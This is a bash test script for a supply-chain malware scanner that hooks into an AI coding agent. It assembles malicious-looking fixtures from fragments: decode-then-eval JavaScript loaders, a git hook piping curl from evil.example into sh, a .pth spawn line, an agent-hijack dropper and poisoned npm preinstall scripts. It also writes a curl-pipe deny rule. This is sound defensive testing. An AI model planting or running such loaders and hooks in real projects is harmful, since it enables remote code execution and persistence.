#!/usr/bin/env bash
# Assemble IOC fixtures from fragments so the scanner does not flag its own tests.

set -uo pipefail

# Discard exported user settings so fixtures retain their intended defaults.
unset WORMHOOK_QUARANTINE WORMHOOK_T2_TTL_HOURS WORMHOOK_DOCTOR_QUIET WORMHOOK_SIGAGE_MAX_DAYS
# shellcheck disable=SC2046  # word-splitting the name list is the point
unset $(compgen -v WORMHOOK_SKIP_ 2>/dev/null) 2>/dev/null || true

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENGINE="$REPO_ROOT/scripts/wormhook.sh"
SCAN_CLI="$REPO_ROOT/scripts/wormhook-scan.sh"

command -v jq >/dev/null 2>&1 || { echo "tests: jq required" >&2; exit 1; }
[[ -r "$ENGINE" ]] || { echo "tests: engine not found ($ENGINE)" >&2; exit 1; }

_e='ev'; _e="${_e}al"; _a='at'; _a="${_a}ob"
MAL_DECODE_EVAL="module.exports = ${_e}(${_a}(process.env.X));"
MAL_INJECT="const k = ${_a}(process.env.FAKE_KEY); ${_e}(k);"
MAL_DROPPER='setup'; MAL_DROPPER="${MAL_DROPPER}.mjs"   # agent-hijack dropper filename
_c='cu'; MAL_CURL_SH="${_c}rl -s http://evil.example/p.sh | sh"   # remote-exec git-hook body
_o='os.sys'; MAL_PTH="import os;${_o}tem('true')"                 # .pth spawn-on-start body
_g='glob'; _tag='A9-05'; _tag="${_tag}22-4"
MAL_DOTTAG="${_g}al.i=\"${_tag}\";"

PASS=0 FAIL=0
TMP_DIRS=()
cleanup() { local d; for d in "${TMP_DIRS[@]:-}"; do [[ -n "$d" && -d "$d" ]] && rm -rf "$d"; done; }
trap cleanup EXIT

_mktemp_case() {  # -> CASE_DIR / CASE_HOME / CASE_CACHE / CASE_CWD
  CASE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/wormhook-test.XXXXXX")"
  TMP_DIRS+=("$CASE_DIR")
  CASE_HOME="$CASE_DIR/home"; CASE_CACHE="$CASE_DIR/cache"; CASE_CWD="$CASE_DIR/cwd"
  mkdir -p "$CASE_HOME" "$CASE_CACHE" "$CASE_CWD"
}

_run_engine() {  # $1 = payload JSON -> the verdict JSON, from the UNCHANGED engine
  printf '%s' "$1" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" bash "$ENGINE" 2>/dev/null
}

_payload() {  # $1=event  $2=command (optional)
  local ev="$1" cmd="${2:-}"
  if [[ -n "$cmd" ]]; then
    jq -nc --arg c "$cmd" --arg w "$CASE_CWD" --arg e "$ev" \
      '{tool_input:{command:$c},cwd:$w,hook_event_name:$e}'
  else
    jq -nc --arg w "$CASE_CWD" --arg e "$ev" '{cwd:$w,hook_event_name:$e}'
  fi
}

_ok()  { PASS=$((PASS+1)); printf '  \033[0;32mPASS\033[0m  %s\n' "$1"; }
_bad() { FAIL=$((FAIL+1)); printf '  \033[1;31mFAIL\033[0m  %s\n' "$1"; [[ -n "${2:-}" ]] && printf '          %s\n' "$2"; }

assert_jq() {
  local name="$1" json="$2" filter="$3"
  if printf '%s' "$json" | jq -e "$filter" >/dev/null 2>&1; then
    _ok "$name"
  else
    _bad "$name" "filter failed: $filter"
    printf '          got: %s\n' "$(printf '%s' "$json" | jq -c '{verdict,decision,hookSpecificOutput,systemMessage}' 2>/dev/null || printf '%s' "$json" | head -c 300)"
  fi
}

echo "wormhook fixtures harness"
echo "  engine: $ENGINE"
echo


_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// agent-hijack dropper payload\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
assert_jq "T0 persistence: HOME/.claude dropper blocks (UPS)" "$OUT" \
  '.decision=="block" and (.systemMessage|contains("AGENT-HIJACK PERSISTENCE"))'

_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/index.js"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "T1 project source: injected loader blocks (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS CODE IN PROJECT SOURCE FILE"))'

_mktemp_case
printf '%s\n' "$MAL_DOTTAG" > "$CASE_CWD/tailwind.config.js"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "T1 project source: dot-form campaign tag blocks (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS CODE IN PROJECT SOURCE FILE"))'

_mktemp_case
mkdir -p "$CASE_CWD/node_modules/evil-pkg"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
printf '/* shai-hulud payload */\n' > "$CASE_CWD/node_modules/evil-pkg/bun_environment.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 node_modules: payload-file IOC -> red verdict (PostToolUse)" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'

_mktemp_case
mkdir -p "$CASE_CWD/node_modules/lib"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
printf '%s\n' "$MAL_DECODE_EVAL" > "$CASE_CWD/node_modules/lib/index.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 node_modules: decode-then-eval behavioral content -> red" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'

_mktemp_case
mkdir -p "$CASE_CWD/node_modules/lib"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
printf 'const _0x3a2ebe=_0x355e;\n' > "$CASE_CWD/node_modules/lib/index.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 node_modules: obfuscator.io accessor alias -> red" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'


# The AWS SDK ships this endpoint; it must remain excluded from signatures.
_mktemp_case
mkdir -p "$CASE_CWD/node_modules/@aws-sdk/core"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
cat > "$CASE_CWD/node_modules/@aws-sdk/core/partitions.json" <<'JSON'
{
  "partitions": [
    {
      "id": "aws-iso-e",
      "regionRegex": "^eu-isoe-\\w+-\\d+$",
      "outputs": {
        "dnsSuffix": "cloud.adc-e.uk",
        "dualStackDnsSuffix": "api.cloud-aws.adc-e.uk",
        "implicitGlobalRegion": "eu-isoe-west-1",
        "name": "aws-iso-e",
        "supportsDualStack": true,
        "supportsFIPS": true
      }
    }
  ]
}
JSON
printf 'export const partitions={dualStackDnsSuffix:"api.cloud-aws.adc-e.uk"};\n' \
  > "$CASE_CWD/node_modules/@aws-sdk/core/partitions.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "FP guard: @aws-sdk partitions adc-e.uk stays green" "$OUT" \
  '.verdict=="green"'

_mktemp_case
printf 'export const env = process.env;\nconsole.log("hello", JSON.parse("{}"));\n' > "$CASE_CWD/app.js"
OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "FP guard: ordinary clean source stays green (SessionStart)" "$OUT" \
  '.verdict=="green"'

_mktemp_case
printf 'global.fetch = fetch;\nglobal.x = "hello";\nglobal.ver = "1.2.3";\nglobal.day = "2026-08";\nglobal.rev = "1-2";\nglobal.n = 10-20;\nconst sku = "%s";\n' \
  "$_tag" > "$CASE_CWD/setup-globals.js"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "FP guard: ordinary global.x writes do not trip the dot-form tag (PreToolUse)" "$OUT" \
  '(.hookSpecificOutput.permissionDecision // "allow") != "deny"'

_mktemp_case
mkdir -p "$CASE_CWD/.claude"
cat > "$CASE_CWD/.claude/settings.json" <<'JSON'
{ "permissions": { "deny": ["Bash(curl * | bash*)", "Bash(curl * | sh*)"] } }
JSON
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
assert_jq "FP guard: curl-pipe DENY policy does not self-flag (UPS clean)" "${OUT:-{}}" \
  '(.decision // "") != "block"'

_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/loader.js"
PRE="$(_run_engine "$(_payload PreToolUse 'npm install')")"
UPS="$(_run_engine "$(_payload UserPromptSubmit)")"

assert_jq "shape: PreToolUse nests permissionDecision==deny" "$PRE" \
  '.hookSpecificOutput.permissionDecision=="deny" and (has("decision")|not)'
assert_jq "shape: UserPromptSubmit uses TOP-LEVEL decision==block" "$UPS" \
  '.decision=="block"'
assert_jq "shape: UserPromptSubmit emits NO hookSpecificOutput.additionalContext" "$UPS" \
  '(.hookSpecificOutput.additionalContext // null) == null'
assert_jq "shape: PreToolUse carries no top-level decision" "$PRE" '(.decision // null)==null'
assert_jq "shape: UserPromptSubmit carries no permissionDecision" "$UPS" \
  '(.hookSpecificOutput.permissionDecision // null)==null'

if [[ -r "$SCAN_CLI" ]] && command -v git >/dev/null 2>&1; then
  _mktemp_case
  mkdir -p "$CASE_CWD/.git/hooks"
  HOME="$CASE_HOME" git config --global core.hooksPath "$CASE_DIR/global-hooks" >/dev/null 2>&1
  HOME="$CASE_HOME" bash "$SCAN_CLI" install-git-hook >/dev/null 2>&1
  HOOK="$CASE_DIR/global-hooks/post-merge"
  if [[ -f "$HOOK" ]]; then
    cp "$HOOK" "$CASE_CWD/.git/hooks/post-merge"
    OUT="$(_run_engine "$(_payload SessionStart)")"
    assert_jq "git-hook body does NOT self-flag (Tier-0, real installer body)" "$OUT" \
      '.verdict=="green"'
    OUT2="$(_run_engine "$(_payload UserPromptSubmit)")"
    assert_jq "git-hook body does NOT self-flag under a block event (UPS)" "${OUT2:-{}}" \
      '(.decision // "") != "block"'
  else
    _bad "git-hook body never self-flags" "installer did not produce $HOOK"
  fi
else
  _bad "git-hook body never self-flags" "wormhook-scan.sh or git unavailable — cannot synthesize the real hook body"
fi

if [[ -r "$SCAN_CLI" ]]; then
  _mktemp_case
  BIN="$CASE_HOME/.local/bin/wormhook-scan"
  # Isolate XDG_CONFIG_HOME too: it overrides HOME for the install pointer.
  CASE_XDG="$CASE_HOME/.config"; PTR="$CASE_XDG/wormhook/install-path"
  _install() { HOME="$CASE_HOME" XDG_CONFIG_HOME="$CASE_XDG" bash "$1" install-cli >/dev/null 2>&1; }
  _install "$SCAN_CLI"

  if [[ -f "$BIN" && ! -L "$BIN" && -x "$BIN" ]]; then _ok "install-cli: writes an executable launcher, not a symlink"
  else _bad "install-cli: writes an executable launcher, not a symlink" "$BIN is missing, a symlink, or not executable"; fi

  cp "$BIN" "$CASE_DIR/launcher.1" 2>/dev/null
  _install "$SCAN_CLI"
  if cmp -s "$CASE_DIR/launcher.1" "$BIN"; then _ok "install-cli: re-run is byte-idempotent"
  else _bad "install-cli: re-run is byte-idempotent" "second run rewrote $BIN"; fi

  mkdir -p "$CASE_DIR/v99"
  cp -R "$REPO_ROOT/scripts" "$CASE_DIR/v99/" 2>/dev/null
  _install "$CASE_DIR/v99/scripts/wormhook-scan.sh"
  if cmp -s "$CASE_DIR/launcher.1" "$BIN"; then _ok "install-cli: a version move leaves the launcher byte-identical"
  else _bad "install-cli: a version move leaves the launcher byte-identical" "a release would re-alert macOS"; fi
  # Resolve /var symlinks as install-cli does before comparing paths.
  WANT="$(cd -P "$CASE_DIR/v99" && pwd)"
  GOT="$(cat "$PTR" 2>/dev/null)"
  if [[ "$GOT" == "$WANT" ]]; then _ok "install-cli: the pointer follows the new install root"
  else _bad "install-cli: the pointer follows the new install root" "want $WANT, got ${GOT:-<no pointer at $PTR>}"; fi

  SUM_BEFORE="$(shasum -a 256 "$SCAN_CLI" | cut -d' ' -f1)"
  ln -sf "$SCAN_CLI" "$BIN"
  _install "$SCAN_CLI"
  if [[ ! -L "$BIN" ]]; then _ok "install-cli: replaces a legacy symlink with the launcher"
  else _bad "install-cli: replaces a legacy symlink with the launcher" "$BIN is still a symlink"; fi
  if [[ "$(shasum -a 256 "$SCAN_CLI" | cut -d' ' -f1)" == "$SUM_BEFORE" ]]; then
    _ok "install-cli: never writes through a symlink onto the installed CLI"
  else _bad "install-cli: never writes through a symlink onto the installed CLI" "clobbered $SCAN_CLI"; fi

  # Omit XDG_CONFIG_HOME to exercise the environment launchd supplies.
  if HOME="$CASE_HOME" "$BIN" --help 2>/dev/null | grep -q 'wormhook-scan —'; then
    _ok "launcher: resolves the engine and runs"
  else _bad "launcher: resolves the engine and runs" "$BIN produced no help output"; fi

  command rm -f "$PTR"
  HOME="$CASE_HOME" "$BIN" --help >/dev/null 2>&1; RC=$?
  if [[ "$RC" -eq 2 ]]; then _ok "launcher: both resolvers dead -> degraded exit 2, never a false 0"
  else _bad "launcher: both resolvers dead -> degraded exit 2, never a false 0" "got rc $RC"; fi
else
  _bad "install-cli launcher" "wormhook-scan.sh unavailable"
fi

_mktemp_case
mkdir -p "$CASE_CWD/node_modules/leftpad"
printf '{"name":"t","version":"1.0.0"}' > "$CASE_CWD/package.json"
printf '{"lockfileVersion":3,"packages":{}}' > "$CASE_CWD/package-lock.json"
printf 'module.exports=function(){return 1}\n' > "$CASE_CWD/node_modules/leftpad/index.js"
MARKER_FILE="$CASE_CACHE/notambourine/malware-scan/$(printf '%s' "$CASE_CWD" | shasum -a 256 | awk '{print $1}')"

OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 cache: clean install-class walk stays green" "$OUT" '.verdict=="green"'
if [[ -f "$MARKER_FILE" ]]; then
  _ok "T2 cache: marker written after clean walk"
else
  _bad "T2 cache: marker written after clean walk" "missing $MARKER_FILE"
fi

OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "T2 cache: fresh marker + unchanged key -> SessionStart reuses cache" "$OUT" \
  '.verdict=="green" and (.systemMessage|contains("cached, deps unchanged"))'

printf '%s\n' "$MAL_DECODE_EVAL" > "$CASE_CWD/node_modules/leftpad/index.js"
touch -t 202001010000 "$MARKER_FILE" 2>/dev/null
OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "T2 cache TTL: expired marker re-walks and catches in-place overwrite" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'


if command -v git >/dev/null 2>&1; then
  _mktemp_case
  git -C "$CASE_CWD" init -q &&
  git -C "$CASE_CWD" -c user.email=t@t.t -c user.name=t commit -q --allow-empty -m init &&
  git -C "$CASE_CWD" worktree add -q "$CASE_DIR/wt" >/dev/null 2>&1
  if [[ -d "$CASE_DIR/wt" ]]; then
    printf '#!/bin/sh\n%s\n' "$MAL_CURL_SH" > "$CASE_CWD/.git/hooks/post-merge"
    chmod +x "$CASE_CWD/.git/hooks/post-merge"
    CASE_CWD="$CASE_DIR/wt"   # scan FROM the worktree
    OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
    assert_jq "T0 git-hook: worktree resolves main repo hooks dir (PreToolUse deny)" "$OUT" \
      '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS GIT HOOK"))'
  else
    _bad "T0 git-hook: worktree resolves main repo hooks dir" "git worktree add failed"
  fi
else
  _bad "T0 git-hook: worktree resolves main repo hooks dir" "git unavailable"
fi

_mktemp_case
mkdir -p "$CASE_CWD/venv312/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_CWD/venv312/lib/python3.12/site-packages/evil.pth"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" VIRTUAL_ENV="$CASE_CWD/venv312" \
    bash "$ENGINE" 2>/dev/null)"
assert_jq "T0 .pth: \$VIRTUAL_ENV venv under a non-standard name denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

_mktemp_case
mkdir -p "$CASE_HOME/.local/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/.local/lib/python3.12/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'python3 app.py')")"
assert_jq "T0 .pth: user site-packages (pip --user) denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

_mktemp_case
mkdir -p "$CASE_HOME/.pyenv/versions/3.12.0/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/.pyenv/versions/3.12.0/lib/python3.12/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'python3 app.py')")"
assert_jq "#58 .pth: pyenv version site-packages denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

_mktemp_case
mkdir -p "$CASE_HOME/Library/Python/3.9/lib/python/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/Library/Python/3.9/lib/python/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'pip install requests')")"
assert_jq "#58 .pth: ~/Library/Python user site denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'


_poison_manifest() { jq -n --arg s "node $MAL_DROPPER" '{scripts:{preinstall:$s}}' > "$1"; }

_mktemp_case
mkdir -p "$CASE_CWD/sub"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/sub/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'cd sub && npm install')")"
assert_jq "#56/#57: cd sub && npm install denies on the sub manifest" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

_mktemp_case
_poison_manifest "$CASE_CWD/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'CI=1 npm install')")"
assert_jq "#56: CI=1 npm install gates and denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/index.js"
OUT="$(_run_engine "$(_payload PostToolUse 'git pull && npm test')")"
assert_jq "#56: git pull && npm test triggers the post-pull scan -> red" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("MALICIOUS CODE IN PROJECT SOURCE FILE")))'

_mktemp_case
mkdir -p "$CASE_CWD/packages/api"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/packages/api/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'npm --prefix packages/api install')")"
assert_jq "#57: npm --prefix packages/api install denies on that manifest" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

_mktemp_case
mkdir -p "$CASE_CWD/packages/evil"
jq -n '{workspaces:["packages/*"],scripts:{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/packages/evil/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "#57 workspaces: poisoned workspace preinstall denies a root install" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

_mktemp_case
mkdir -p "$CASE_CWD/apps/evil"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
printf 'packages:\n  - "apps/*"\n' > "$CASE_CWD/pnpm-workspace.yaml"
_poison_manifest "$CASE_CWD/apps/evil/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'pnpm install')")"
assert_jq "#57 pnpm-workspace.yaml: poisoned workspace preinstall denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

_mktemp_case
mkdir -p "$CASE_CWD/packages/app"
jq -n '{workspaces:["packages/*"],scripts:{}}' > "$CASE_CWD/package.json"
printf '{"scripts":{"preinstall":"node scripts/gen.js"}}' > "$CASE_CWD/packages/app/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'cd packages/app && CI=1 npm install')")"
assert_jq "FP guard: clean compound install in a workspace stays green" "$OUT" \
  '.verdict=="green"'


# shellcheck source=../scripts/malware-patterns.sh disable=SC1091
. "$REPO_ROOT/scripts/malware-patterns.sh"

_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// dropper\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
assert_jq "quarantine default-off: hit still blocks" "$OUT" '.decision=="block"'
if [[ -f "$CASE_HOME/.claude/$MAL_DROPPER" ]]; then
  _ok "quarantine default-off: artifact left in place"
else
  _bad "quarantine default-off: artifact left in place" "file moved without the flag"
fi

_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// dropper\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(printf '%s' "$(_payload UserPromptSubmit)" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: UPS still blocks and reports QUARANTINED" "$OUT" \
  '.decision=="block" and (.systemMessage|contains("QUARANTINED"))'
if [[ ! -e "$CASE_HOME/.claude/$MAL_DROPPER" ]] \
   && ls "$CASE_HOME/.claude/$MAL_DROPPER".wormhook-quarantined.* >/dev/null 2>&1; then
  _ok "quarantine: exact-match artifact renamed to *.wormhook-quarantined.*"
else
  _bad "quarantine: exact-match artifact renamed" "original still present or no quarantined copy"
fi
if [[ -s "$CASE_CACHE/notambourine/malware-scan/quarantine.log" ]]; then
  _ok "quarantine: action recorded in quarantine.log"
else
  _bad "quarantine: action recorded in quarantine.log" "log missing or empty"
fi

_mktemp_case
mkdir -p "$CASE_CWD/.venv/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_CWD/.venv/lib/python3.12/site-packages/evil.pth"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: behavioral .pth still denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny"'
if [[ -f "$CASE_CWD/.venv/lib/python3.12/site-packages/evil.pth" ]]; then
  _ok "quarantine: behavioral .pth left in place (report-only)"
else
  _bad "quarantine: behavioral .pth left in place" "behavioral match was moved"
fi

_mktemp_case
mkdir -p "$CASE_CWD/.venv/lib/python3.12/site-packages"
printf '# sys.path shim\n' > "$CASE_CWD/.venv/lib/python3.12/site-packages/$MALWARE_PTH_IOC_NAME"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: known-bad .pth name denies + reports QUARANTINED" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.systemMessage|contains("QUARANTINED"))'
if [[ ! -e "$CASE_CWD/.venv/lib/python3.12/site-packages/$MALWARE_PTH_IOC_NAME" ]]; then
  _ok "quarantine: known-bad .pth name renamed"
else
  _bad "quarantine: known-bad .pth name renamed" "exact-name IOC left in place"
fi

_mktemp_case
cp -R "$REPO_ROOT/scripts" "$CASE_DIR/scripts"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
if [[ -z "$OUT" ]]; then
  _ok "integrity: pristine copy is silent"
else
  _bad "integrity: pristine copy is silent" "emitted: $OUT"
fi
printf '\n# appended by test\n' >> "$CASE_DIR/scripts/wormhook.sh"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
assert_jq "integrity: one appended line flips 🔴 and names wormhook.sh" "$OUT" \
  '(.systemMessage|contains("🔴") and contains("wormhook.sh")) and (.hookSpecificOutput.additionalContext|contains("SELF-INTEGRITY FAILURE"))'
mv "$CASE_DIR/scripts/integrity.sha256" "$CASE_DIR/scripts/integrity.sha256.gone"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
assert_jq "integrity: missing manifest degrades 🟡 (fail open, loud)" "$OUT" \
  '.systemMessage|contains("🟡") and contains("manifest missing")'


_mkplug() {
  mkdir -p "$1/.claude-plugin" "$1/scripts/doctor"
  cp "$REPO_ROOT/scripts/doctor/drift.sh" "$REPO_ROOT/scripts/doctor/_utils.sh" "$1/scripts/doctor/"
  printf '{"name":"%s","version":"%s"}\n' "${3:-wormhook}" "$2" > "$1/.claude-plugin/plugin.json"
}
_drift() { CLAUDE_PLUGIN_ROOT="$1" bash "$1/scripts/doctor/drift.sh" 2>/dev/null; }

_mktemp_case
P="$CASE_DIR/.claude/plugins"
mkdir -p "$P/marketplaces/notambourine/.claude-plugin"
printf '{"name":"notambourine","plugins":[{"name":"wormhook","source":{"source":"url","url":"u"}}]}\n' \
  > "$P/marketplaces/notambourine/.claude-plugin/marketplace.json"
_mkplug "$P/cache/notambourine/wormhook/0.9.0" 0.9.0
_mkplug "$P/cache/notambourine/wormhook/0.26.0" 0.26.0
assert_jq "drift: catalog install, stale copy flags 🟡 with the update command" \
  "$(_drift "$P/cache/notambourine/wormhook/0.9.0")" \
  '.systemMessage|contains("🟡") and contains("v0.9.0") and contains("v0.26.0") and contains("update wormhook@notambourine")'
OUT="$(_drift "$P/cache/notambourine/wormhook/0.26.0")"
if [[ -z "$OUT" ]]; then _ok "drift: newest copy is silent (0.26.0 outranks 0.9.0, not lexically)"
else _bad "drift: newest copy is silent" "emitted: $OUT"; fi
OUT="$(WORMHOOK_SKIP_DRIFT=1 CLAUDE_PLUGIN_ROOT="$P/cache/notambourine/wormhook/0.9.0" \
  bash "$P/cache/notambourine/wormhook/0.9.0/scripts/doctor/drift.sh" 2>/dev/null)"
assert_jq "drift: silenced lag degrades to ⚪, never to actual silence" "$OUT" \
  '.systemMessage|contains("⚪") and contains("silenced")'

_mktemp_case
P="$CASE_DIR/.claude/plugins"
mkdir -p "$P/marketplaces/nt/.claude-plugin"
printf '{"name":"nt","plugins":[{"name":"wormhook","source":"./plugins/wormhook"}]}\n' \
  > "$P/marketplaces/nt/.claude-plugin/marketplace.json"
_mkplug "$P/marketplaces/nt/plugins/wormhook" 0.30.0
_mkplug "$P/cache/nt/wormhook/0.26.0" 0.26.0
assert_jq "drift: path-sourced row compares against the marketplace clone" \
  "$(_drift "$P/cache/nt/wormhook/0.26.0")" \
  '.systemMessage|contains("🟡") and contains("v0.30.0")'

OUT="$(bash "$REPO_ROOT/scripts/doctor/drift.sh" 2>/dev/null)"
if [[ -z "$OUT" ]]; then _ok "drift: dev checkout stays silent"
else _bad "drift: dev checkout stays silent" "emitted: $OUT"; fi


_mkcicd() {
  _mktemp_case
  mkdir -p "$CASE_CWD/.github/workflows"
  git -C "$CASE_CWD" init -q 2>/dev/null
  printf '{"name":"t"}\n' > "$CASE_CWD/package.json"
  printf '%s\n' "$1" > "$CASE_CWD/.github/workflows/ci.yml"
}
_cicd() { (cd "$CASE_CWD" && bash "$REPO_ROOT/scripts/doctor/cicd.sh" 2>/dev/null); }

_mkcicd 'jobs: { build: { steps: [ { uses: actions/checkout@v4 } ] } }'
assert_jq "cicd: Actions + manifest with no gate flags 🟡" "$(_cicd)" \
  '.systemMessage|contains("🟡") and contains("no wormhook CI gate")'

_mkcicd 'jobs: { scan: { steps: [ { uses: notambourine/wormhook@v1 } ] } }'
OUT="$(_cicd)"
if [[ -z "$OUT" ]]; then _ok "cicd: direct uses: of the action is silent"
else _bad "cicd: direct uses: of the action is silent" "emitted: $OUT"; fi

_mkcicd 'jobs: { fleet: { uses: notambourine/fleet-actions/.github/workflows/fleet-ci.yml@abc123 } }'
OUT="$(_cicd)"
if [[ -z "$OUT" ]]; then _ok "cicd: reusable-workflow call is undecidable, not a finding"
else _bad "cicd: reusable-workflow call is undecidable, not a finding" "emitted: $OUT"; fi

for location in home cwd; do
  _mktemp_case
  if [[ "$location" == home ]]; then CASE_HOME="$CASE_DIR/home with spaces"; target="$CASE_HOME"
  else CASE_CWD="$CASE_DIR/repo with spaces"; target="$CASE_CWD"; fi
  mkdir -p "$target/.claude"
  printf '// fixture\n' > "$target/.claude/$MAL_DROPPER"
  OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
  assert_jq "T0 persistence: $location path containing spaces blocks" "$OUT" '.decision=="block"'
done

_mktemp_case
mkdir -p "$CASE_DIR/other/.claude"
printf '// fixture\n' > "$CASE_DIR/other/.claude/$MAL_DROPPER"
OUT="$(_run_engine "$(_payload PreToolUse "npm --prefix $CASE_DIR/other install")")"
assert_jq "T0 persistence: command target outside CWD blocks" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny"'

_mktemp_case
mkdir -p "$CASE_DIR/other/.venv/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_DIR/other/.venv/lib/python3.12/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse "cd $CASE_DIR/other && python3 app.py")")"
assert_jq "T0 Python: command target venv outside CWD blocks" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny"'

_mktemp_case
mkdir -p "$CASE_DIR/other"
